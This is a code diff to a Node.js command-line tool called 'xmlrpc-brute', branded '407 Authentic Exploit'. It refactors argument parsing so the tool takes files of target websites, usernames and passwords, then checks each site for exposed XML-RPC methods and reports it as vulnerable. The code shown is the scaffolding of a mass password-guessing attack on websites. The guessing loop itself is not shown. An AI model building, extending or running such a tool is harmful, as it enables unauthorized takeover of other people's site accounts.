@@ -17,14 +17,38 @@ const {
     }
 } = require('ansi-colors');
 
-const argv = yargs(hideBin(process.argv)).argv;
+const argv = yargs(hideBin(process.argv))
+  .usage('Usage: node . [options...]')
+  .options({
+      siteList: {
+          alias: 's',
+          description: 'path to file containing websites',
+          requiresArgv: true,
+          required: true
+      },
+      userList: {
+          alias: 'u',
+          description: 'path to file containing username',
+          requiresArgv: true,
+          required: true
+      },
+      passList: {
+          alias: 'p',
+          description: 'path to file containing password',
+          requiresArgv: true,
+          required: true
+      },
+  })
+  .argv;
+
 const {
     cwd: pathTo
 } = process;
 const {
     siteList,
     userList,
-    passList
+    passList,
+    help
 } = argv;
 
 const {
@@ -47,40 +71,37 @@ String.prototype.ansii = function ({
     return `${'[' + color(type) + ']'} ${this}`;
 }
 
-asciify('xmlrpc-brute', {
-    font: 'puffy'
-}, function (err, log) {
-    console.log(log);
-    console.log('                   - ibnusyawall | 407 Authentic Exploit -\n');
-});
+let pathSiteList = fs.existsSync(pathTo() + '/' + siteList);
+let pathUserList = fs.existsSync(pathTo() + '/' + userList);
+let pathPassList = fs.existsSync(pathTo() + '/' + passList);
 
-switch (true) {
-    case ((!siteList) || (!fs.existsSync(pathTo() + '/' + siteList))):
-        console.log('site list not found'.ansii({
-            type: warning,
-            color: red
-        }));
-        break;
-    case ((!userList) || (!fs.existsSync(pathTo() + '/' + userList))):
-        console.log('user list not found'.ansii({
-            type: warning,
-            color: red
-        }));
-        break;
-    case ((!passList) || (!fs.existsSync(pathTo() + '/' + passList))):
-        console.log('pass list not found'.ansii({
-            type: warning,
-            color: red
-        }));
-        break;
-    default:
-        rsiteList = fs.readFileSync(pathTo() + '/' + siteList, 'utf-8');
-        ruserList = fs.readFileSync(pathTo() + '/' + userList, 'utf-8');
-        rpassList = fs.readFileSync(pathTo() + '/' + passList, 'utf-8');
-        break;
+if (!!pathSiteList) {
+    rsiteList = fs.readFileSync(pathTo() + '/' + siteList, 'utf-8');
+}
+if (!!pathUserList) {
+    ruserList = fs.readFileSync(pathTo() + '/' + userList, 'utf-8');
+}
+if (!!pathPassList) {
+    rpassList = fs.readFileSync(pathTo() + '/' + passList, 'utf-8');
+}
+
+if (!(pathSiteList && pathUserList && pathPassList)) {
+    console.log(`file not found`.ansii({
+        type: warning,
+        color: red
+    }));
+} else {
+    main();
 }
 
 async function main() {
+    asciify('xmlrpc-brute', {
+        font: 'puffy'
+    }, function (err, log) {
+        console.log(log);
+        console.log('                   - ibnusyawall | 407 Authentic Exploit -\n');
+    });
+
     var listSite = rsiteList.split`\n`.filter(site => site);
     var listUser = ruserList.split`\n`.filter(user => user);
     var listPass = rpassList.split`\n`.filter(pass => pass);
@@ -95,7 +116,7 @@ async function main() {
         try {
             var {
                 status
-            } = await getListMethods(url)
+            } = await getListMethods(url);
             console.log(`Site vuln: ${url}`.ansii({
                 type: info,
                 color: blue
@@ -169,5 +190,3 @@ async function main() {
         }
     }
 }
-
-main();
